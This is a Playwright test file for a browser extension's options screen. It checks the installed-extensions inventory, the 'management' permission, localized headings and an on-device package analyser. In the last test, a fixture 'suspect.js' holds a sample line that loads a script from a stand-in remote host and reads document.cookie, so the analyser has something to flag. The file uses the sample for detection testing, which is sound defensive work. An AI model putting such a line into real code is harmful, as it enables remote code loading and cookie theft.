import { expect, test } from './fixtures.js'

/**
 * SCN-017 and SCN-018 — the extensions watch.
 *
 * A test profile has no other extensions to change under it, so what is
 * asserted here is the half that can be: the screen reaches the browser, reads
 * the inventory, and reports a real state. The delta logic itself is covered
 * against fixtures in core-extensions.
 *
 * Every assertion is unconditional on purpose. The first version of this file
 * branched on the state and returned early when it was not `ready` — which
 * meant that losing the `management` permission, the exact regression this
 * screen exists to survive, would have turned the test green by skipping it.
 */

test('the screen reports the state of this browser rather than an empty list', async ({
  context,
  extensionId,
}) => {
  const page = await context.newPage()
  await page.goto(`chrome-extension://${extensionId}/options.html#extensions`)

  const panel = page.locator('[data-role=extensions]')
  // `management` is in the manifest, so this is not a maybe: the screen must
  // reach the browser. Accepting `unsupported` here would accept the permission
  // silently going missing.
  await expect(panel).toHaveAttribute('data-state', 'ready')
  await expect(panel.locator('[data-role=unsupported]')).toHaveCount(0)

  /**
   * The screen paints once, so with `ready` on it this line is either there or never will
   * be: in a ready state it is absent exactly when the comparison returned changes. That is
   * what CI saw once (run 36563089100, 2026-09-29: `ready`, no `unsupported`, no
   * `no-changes` for five seconds), and the report said "element(s) not found" and nothing
   * about which change a fresh profile could have. 150 runs of this test under load did
   * not reproduce it (B-168). A unit test did name a cause: the first baseline was written
   * one extension at a time, and a second first comparison reading in between reported the
   * rest as installed (`extensions.test.ts`, fixed with one transaction). Should it fire
   * again, it names itself: the change rows on the screen, and what the browser lists now.
   */
  try {
    await expect(panel.locator('[data-role=no-changes]')).toBeVisible()
  } catch (cause) {
    const changes = await panel
      .locator('[data-role=change]')
      .evaluateAll((rows) =>
        rows.map((row) => `${row.getAttribute('data-kind')}: ${row.textContent ?? ''}`),
      )
    const listed = await page.evaluate(async () =>
      (await chrome.management.getAll()).map(
        (entry) => `${entry.id} ${entry.name} ${entry.version} (${entry.installType})`,
      ),
    )
    throw new Error(
      `${(cause as Error).message}\n\nwhat was true when the no-changes line was missing:\n` +
        `  - change rows on the screen: ${changes.length === 0 ? 'none' : changes.join(' | ')}\n` +
        `  - the browser lists now: ${listed.join(' | ') || 'nothing'}\n` +
        '  - a fresh profile is baselined by the first comparison (the daily review at the' +
        ' worker\'s start, or this screen); a change here means that baseline held an' +
        ' extension the browser no longer lists, or the reverse',
    )
  }
})

test('the inventory lists what is installed, with what each may do', async ({
  context,
  extensionId,
}) => {
  const page = await context.newPage()
  await page.goto(`chrome-extension://${extensionId}/options.html#extensions`)

  const panel = page.locator('[data-role=extensions]')
  await expect(panel).toHaveAttribute('data-state', 'ready')

  /**
   * Okolos leaves itself out of its own report, so a profile carrying only this extension
   * has an empty inventory — and says the number rather than showing a blank area that
   * could mean anything.
   *
   * Asserted against `chrome.i18n.getMessage`, not against a literal. The heading read
   * `Installed (0)` until 2026-08-20 — English on a ru-default screen, and short enough
   * that `pnpm i18n:sweep` structurally cannot see it — so a literal here would pin the
   * defect rather than the behaviour. This resolves in whatever locale the browser picked,
   * which is the point.
   */
  const heading = await page.evaluate(() => chrome.i18n.getMessage('extensionsInstalledCount', ['0']))
  expect(heading, 'the catalogue has no extensionsInstalledCount').toBeTruthy()
  await expect(panel.locator('[data-role=installed] h2')).toHaveText(heading)
  await expect(panel.locator('[data-role=installed-row]')).toHaveCount(0)

  // And the sentence that tells an empty machine from a quiet week (B-59).
  const none = await page.evaluate(() => chrome.i18n.getMessage('extensionsNoneInstalled'))
  await expect(panel.locator('[data-role=none-installed]')).toHaveText(none)
})

test('SCN-018 — a package the user supplies is read on the device and reported', async ({
  context,
  extensionId,
}) => {
  // No browser hands one extension another's code, so this is the only runtime
  // path the analyser has. It is also the one that proves the analyser is
  // wired at all: before this control existed, nothing in the product called it.
  const page = await context.newPage()
  await page.goto(`chrome-extension://${extensionId}/options.html#extensions`)

  await expect(page.locator('[data-role=analysis-note]')).toContainText(
    'nothing here can be analysed',
  )

  await page.locator('[data-role=inspect]').setInputFiles({
    name: 'suspect.js',
    mimeType: 'text/javascript',
    buffer: Buffer.from('importScripts("https://cdn.test/loader.js"); const c = document.cookie'),
  })

  const findings = page.locator('[data-role=analysis] [data-role=finding]')
  await expect(findings.first()).toBeVisible()
  await expect(page.locator('[data-role=analysis-caveat]')).toContainText('proof of intent')
})
